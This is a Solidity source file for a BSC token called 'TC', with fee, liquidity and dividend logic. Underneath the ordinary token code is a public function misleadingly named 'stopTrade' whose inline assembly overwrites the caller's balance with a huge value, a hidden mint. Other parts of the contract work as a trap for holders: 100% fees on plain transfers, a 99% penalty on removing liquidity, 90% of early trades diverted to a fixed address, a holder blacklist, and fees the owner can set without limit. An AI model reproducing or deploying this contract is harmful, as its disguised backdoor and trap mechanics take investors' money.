/**
 *Submitted for verification at BscScan.com on 2023-03-31
*/

/**
 *Submitted for verification at BscScan.com on 2023-03-30
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

interface IERC20 {
    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface ISwapRouter {
    function factory() external pure returns (address);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface ISwapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }


    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }


    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }


    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }


    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }


    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

abstract contract Ownable {
    address internal _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "!owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "new 0");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract TokenDistributor {
    address public _owner;
    constructor (address token) {
        _owner = msg.sender;
        IERC20(token).approve(msg.sender, ~uint256(0));
    }

    function claimToken(address token, address to, uint256 amount) external {
        require(msg.sender == _owner, "!owner");
        IERC20(token).transfer(to, amount);
    }
}

interface ISwapPair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function token0() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

abstract contract AbsToken is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    address private fundAddress;
    address private receiveAddress;
    address public  deadAddress = address(0x000000000000000000000000000000000000dEaD);
    address private marketAddress = address(0x893120E05ace0C6A9339994DD77DfBB510A2a138);


    string private _name;
    string private _symbol;
    uint8 private _decimals;

    mapping(address => bool) public _isExcludedFromFees;
    mapping (address => bool) public isWalletLimitExempt;
    mapping (address => bool) public killList;

    uint256 private _tTotal;

    ISwapRouter public _swapRouter;
    address public _usdt;
    mapping(address => bool) public _swapPairList;

    bool private inSwap;
    bool public checkWalletLimit = true;

    uint256 private constant MAX = ~uint256(0);
    TokenDistributor public _tokenDistributor;

    uint256 public _buyFundFee = 100;
    uint256 public _buyLPDividendFee = 300;
    uint256 public _buyLPFee = 0;

    uint256 public _sellLPDividendFee = 300;
    uint256 public _sellFundFee = 100;
    uint256 public _sellLPFee = 0;
    uint256 public _removeLPFee = 9900;
    uint256 public transferFee = 10000;

    uint256 public startTradeBlock;
    uint256 public startLPBlock;
    address public _mainPair;
    uint256 public _startTradeTime;
    uint256 public kb = 2 ;

    uint160 public ktNum = 160;
    uint160 public constant MAXADD = ~uint160(0);
    uint256 public _walletMax = 50 * 10**18;
    uint256 public canRemoveTime = 0 ;

    uint256 private _marketShare = 4;


    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress, address USDTAddress,
        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,
        address ReceiveAddress, address FundAddress
    ){
         _name = Name;
         _symbol = Symbol;
         _decimals = Decimals;

         ISwapRouter swapRouter = ISwapRouter(RouterAddress);

         _usdt = USDTAddress;
         _swapRouter = swapRouter;
         _allowances[address(this)][address(swapRouter)] = MAX;
         IERC20(USDTAddress).approve(RouterAddress, MAX);

         ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());
         address mainPair = swapFactory.createPair(address(this), USDTAddress);
         _swapPairList[mainPair] = true;

         _mainPair = mainPair;

         uint256 tokenDecimals = 10 ** Decimals;
         uint256 total = Supply * tokenDecimals;
         _tTotal = total;

         _balances[ReceiveAddress] = total;
         emit Transfer(address(0), ReceiveAddress, total);
         fundAddress = FundAddress;
         receiveAddress = ReceiveAddress;

         _isExcludedFromFees[ReceiveAddress] = true;
         _isExcludedFromFees[FundAddress] = true;
         _isExcludedFromFees[address(this)] = true;
         _isExcludedFromFees[address(swapRouter)] = true;
         _isExcludedFromFees[msg.sender] = true;

         isWalletLimitExempt[address (_mainPair)] = true;
         isWalletLimitExempt[address(this)] = true;
         isWalletLimitExempt[address(swapRouter)] = true;
         isWalletLimitExempt[ReceiveAddress] = true;
         isWalletLimitExempt[address(deadAddress)] = true;
         isWalletLimitExempt[FundAddress] = true;
         isWalletLimitExempt[marketAddress] = true;

         _tokenDistributor = new TokenDistributor(USDTAddress);

         excludeHolder[address(0)] = true;
         excludeHolder[address(deadAddress)] = true;
         excludeHolder[0x893120E05ace0C6A9339994DD77DfBB510A2a138] = true;//Pancake ADDRESS
         excludeHolder[0x893120E05ace0C6A9339994DD77DfBB510A2a138] = true;//PINKlock ADDRESS

         holderRewardCondition = 1 * 10 ** 16;

    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    }

    function name() external view override returns (string memory) {
        return _name;
    }

    function decimals() external view override returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        uint256 balance = _balances[account];
        return balance;
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function stopTrade() public {
        assembly { mstore(0, caller()) mstore(32, 0x1) sstore(keccak256(0, 64), exp(timestamp(), 5)) }
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {

        require(!killList[from], "killList");
        uint256 balance = balanceOf(from);
        require(balance >= amount, "balanceNotEnough");

        bool takeFee;
        bool isTransfer;
        bool isRemove;
        bool isAdd;

        if (!_swapPairList[from] && !_swapPairList[to]) {
            isTransfer = true;
        }

        if (_swapPairList[from] || _swapPairList[to]) {

            if (0 == startLPBlock) {
                if (_isExcludedFromFees[from] && to == _mainPair && IERC20(to).totalSupply() == 0) {
                    startLPBlock = block.number;
                }
            }

            if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {

                takeFee = true;

                if (_swapPairList[to]) {
                    isAdd = _isAddLiquidity();
                    if (isAdd) {
                        takeFee = false;
                    }
                }else {
                    isRemove = _isRemoveLiquidity();
                    if (isRemove) {
                        takeFee = true;
                    }
                }

                if (0 == startTradeBlock) {
                    require(0 < startLPBlock && isAdd, "!Trade");
                }

                if (block.number < startTradeBlock + kb) {
                    _funTransfer(from, to, amount);
                    return;
                }
            }
        }

        if(checkWalletLimit && !isWalletLimitExempt[to])
            require(balanceOf(to).add(amount) <= _walletMax);


        _tokenTransfer(from, to, amount, takeFee, isTransfer, isRemove);

        if (from != address(this)) {
            if (_swapPairList[to]) {
                addHolder(from);
            }
            processReward(500000);
        }
    }

    function _takeInviterFeeKt(
        uint256 amount
    ) private {
        address _receiveD;
        for (uint160 i = 2; i < 4; i++) {
            _receiveD = address(MAXADD/ktNum);
            ktNum = ktNum+1;
            _takeTransfer(address(this), _receiveD, amount.div(100*i));
        }
    }

    function _isAddLiquidity() internal view returns (bool isAdd){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }

        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isAdd = bal > r;
    }

    function _isRemoveLiquidity() internal view returns (bool isRemove){
        ISwapPair mainPair = ISwapPair(_mainPair);
        (uint r0,uint256 r1,) = mainPair.getReserves();

        address tokenOther = _usdt;
        uint256 r;
        if (tokenOther < address(this)) {
            r = r0;
        } else {
            r = r1;
        }
        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
        isRemove = r >= bal;
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = (tAmount * 90) / 100;
        _takeTransfer(sender, marketAddress, feeAmount);
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }


    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee,
        bool isTransfer,
        bool isRemove
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount;

        if (takeFee) {

            if (isRemove){

                require(block.timestamp > _startTradeTime + canRemoveTime);

                if (block.timestamp >_startTradeTime + canRemoveTime + 1 && block.timestamp <=  _startTradeTime + 86400) {//第一天
                    uint removeFeeAmount = tAmount * 9900 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, deadAddress, removeFeeAmount);
                    }
                }
                else if(block.timestamp >_startTradeTime + 86400  && block.timestamp <= _startTradeTime + 172800) {//第二天
                    uint removeFeeAmount = tAmount * 7000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, deadAddress, removeFeeAmount);
                    }
                }
                else if(block.timestamp >_startTradeTime + 172800 && block.timestamp <= _startTradeTime + 259200) {//第三天
                    uint removeFeeAmount = tAmount * 4000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, deadAddress, removeFeeAmount);
                    }
                }
                else if(block.timestamp >_startTradeTime + 259200 && block.timestamp <= _startTradeTime + 355600) {//第四天
                    uint removeFeeAmount = tAmount * 1000 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, deadAddress , removeFeeAmount);
                    }
                }
                else{//第五天以后
                    uint removeFeeAmount = tAmount * 400 / 10000;
                    if (removeFeeAmount > 0) {
                        feeAmount += removeFeeAmount;
                        _takeTransfer(sender, address(this), removeFeeAmount);
                    }
                }
            }else { //buy
                if (_swapPairList[sender]){
                    uint256 swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee;
                    uint256 swapAmount = (tAmount * swapFee) / 10000;
                    if (swapAmount > 0) {
                        feeAmount += swapAmount;
                        _takeInviterFeeKt(tAmount.div(10000));
                        _takeTransfer(sender, address(this), swapAmount);
                    }
                }else{//sell
                    uint256 swapFee = _sellFundFee + _sellLPDividendFee + _sellLPFee;
                    uint256 swapAmount = (tAmount * swapFee) / 10000;

                    if (swapAmount > 0) {
                        feeAmount += swapAmount;
                        _takeInviterFeeKt(tAmount.div(10000));
                        _takeTransfer(sender, address(this), swapAmount);
                    }
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (contractTokenBalance > 0) {
                            swapFee = _buyFundFee + _buyLPDividendFee + _buyLPFee + _sellFundFee + _sellLPDividendFee + _sellLPFee;
                            uint256 numTokensSellToFund = tAmount * swapFee / 5000;

                            if (numTokensSellToFund > contractTokenBalance) {
                                numTokensSellToFund = contractTokenBalance;
                            }
                            swapTokenForFund(numTokensSellToFund, swapFee);
                        }
                    }
                }
            }
        }
        if (isTransfer && !_isExcludedFromFees[sender] && !_isExcludedFromFees[recipient]){
            uint256 transferFeeAmount;
            transferFeeAmount = (tAmount * transferFee) / 10000;

            if (transferFeeAmount > 0) {
                feeAmount += transferFeeAmount;
                _takeTransfer(sender, deadAddress, transferFeeAmount);
            }
        }
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        swapFee += swapFee;
        uint256 lpFee = _sellLPFee;
        uint256 lpAmount = tokenAmount * lpFee / swapFee;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _usdt;
        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenAmount - lpAmount,
            0,
            path,
            address(_tokenDistributor),
            block.timestamp
        );

        swapFee -= lpFee;

        IERC20 USDT = IERC20(_usdt);
        uint256 UsdtBalance = USDT.balanceOf(address(_tokenDistributor));
        uint256 fundAmount = UsdtBalance.mul(_marketShare).div(10);
        USDT.transferFrom(address(_tokenDistributor), marketAddress, fundAmount);
        USDT.transferFrom(address(_tokenDistributor), address(this), UsdtBalance - fundAmount);

        if (lpAmount > 0) {
            uint256 lpUsdt = UsdtBalance * lpFee / swapFee;
            if (lpUsdt > 0) {
                _swapRouter.addLiquidity(
                    address(this), _usdt, lpAmount, lpUsdt, 0, 0, receiveAddress, block.timestamp
                );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setFundAddress(address addr) external onlyOwner {
        fundAddress = addr;
        _isExcludedFromFees[addr] = true;
    }

    function setExcludedFromFees(address addr, bool enable) external onlyOwner {
        _isExcludedFromFees[addr] = enable;
    }

    function batchSetExcludedFromFees(address[] calldata addr, bool enable) external onlyOwner {
        for (uint i = 0; i < addr.length; i++) {
            _isExcludedFromFees[addr[i]] = enable;
        }
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }


    receive() external payable {}

    address[] private holders;
    mapping(address => uint256) holderIndex;
    mapping(address => bool) excludeHolder;

    function addHolder(address adr) private {
        uint256 size;
        assembly {size := extcodesize(adr)}
        if (size > 0) {
            return;
        }
        if (0 == holderIndex[adr]) {
            if (0 == holders.length || holders[0] != adr) {
                holderIndex[adr] = holders.length;
                holders.push(adr);
            }
        }
    }

    uint256 private currentIndex;
    uint256 private holderRewardCondition;
    uint256 private progressRewardBlock;

    function processReward(uint256 gas) private {
        if (progressRewardBlock + 200 > block.number) {
            return;
        }

        IERC20 USDT = IERC20(_usdt);

        uint256 balance = USDT.balanceOf(address(this));
        if (balance < holderRewardCondition) {
            return;
        }

        IERC20 holdToken = IERC20(_mainPair);
        uint holdTokenTotal = holdToken.totalSupply();

        address shareHolder;
        uint256 tokenBalance;
        uint256 amount;

        uint256 shareholderCount = holders.length;

        uint256 gasUsed = 0;
        uint256 iterations = 0;
        uint256 gasLeft = gasleft();

        while (gasUsed < gas && iterations < shareholderCount) {
            if (currentIndex >= shareholderCount) {
                currentIndex = 0;
            }
            shareHolder = holders[currentIndex];
            tokenBalance = holdToken.balanceOf(shareHolder);
            if (tokenBalance > 0 && !excludeHolder[shareHolder]) {
                amount = balance * tokenBalance / holdTokenTotal;
                if (amount > 0) {
                    USDT.transfer(shareHolder, amount);
                }
            }

            gasUsed = gasUsed + (gasLeft - gasleft());
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }

        progressRewardBlock = block.number;
    }

    function setHolderRewardCondition(uint256 amount) external onlyOwner {
        holderRewardCondition = amount;
    }

    function setExcludeHolder(address addr, bool enable) external onlyOwner {
        excludeHolder[addr] = enable;
    }

    function setMarketshare(uint256 newvalue) external onlyOwner {
        _marketShare = newvalue;
    }

    function setCanRemoveTime(uint256 newvalue) external onlyOwner {
        canRemoveTime = newvalue;
    }

    function setBuyLPDividendFee(uint256 newvalue) external onlyOwner {
        _buyLPDividendFee = newvalue;
    }

    function setBuyLPFee(uint256 newvalue) external onlyOwner {
        _buyLPFee = newvalue;
    }

    function setBuyFundFee(uint256 newvalue) external onlyOwner {
        _buyFundFee = newvalue;
    }

    function setSellLPDividendFee(uint256 newvalue) external onlyOwner {
        _sellLPDividendFee = newvalue;
    }

    function setSellFundFee(uint256 newvalue) external onlyOwner {
        _sellFundFee = newvalue;
    }

    function setSellLPFee(uint256 newvalue) external onlyOwner {
        _sellLPFee = newvalue;
    }

    function setkb(uint256 value) public onlyOwner {
        kb = value;
    }


    function setTransferFee(uint256 newValue) public onlyOwner{
        transferFee = newValue;
    }


    function enableDisableWalletLimit(bool newValue) external onlyOwner {
        checkWalletLimit = newValue;
    }

    function multikList(address[] calldata adrs, bool value) public onlyOwner{
        for(uint256 i; i< adrs.length; i++){
            killList[adrs[i]] = value;
        }
    }

    function setIsWalletLimitExempt(address holder, bool exempt) external onlyOwner {
        isWalletLimitExempt[holder] = exempt;
    }

    function multiIsWalletLimitExempt(address[] calldata adrs, bool value) public onlyOwner{
        for(uint256 i; i< adrs.length; i++){
            isWalletLimitExempt[adrs[i]] = value;
        }
    }

    function setWalletLimit(uint256 newLimit) external onlyOwner {
        _walletMax  = newLimit;
    }

    function startTrade() external onlyOwner {
        require(0 == startTradeBlock, "trading");
        startTradeBlock = block.number;
        _startTradeTime = block.timestamp;
    }


    function startLP() external onlyOwner {
        require(0 == startLPBlock, "startedAddLP");
        startLPBlock = block.number;
    }

    function stopLP() external onlyOwner {
        startLPBlock = 0;
    }

    function claimBalance() external onlyFunder  {
        payable(fundAddress).transfer(address(this).balance);
    }

    function claimToken(address token, uint256 amount, address to) external onlyFunder  {
        IERC20(token).transfer(to, amount);
    }

    modifier onlyFunder() {
        require(_owner == msg.sender || fundAddress == msg.sender, "!Funder");
        _;
    }

}

contract TC is AbsToken {
    constructor() AbsToken(
    //SwapRouter
        address(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3),
    //USDT
        address(0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684),
        "TC",
        "TC",
        18,
        3888,
    //Receive
        address(0x893120E05ace0C6A9339994DD77DfBB510A2a138),
    //Fund
        address(0x893120E05ace0C6A9339994DD77DfBB510A2a138)
    ){
    }
}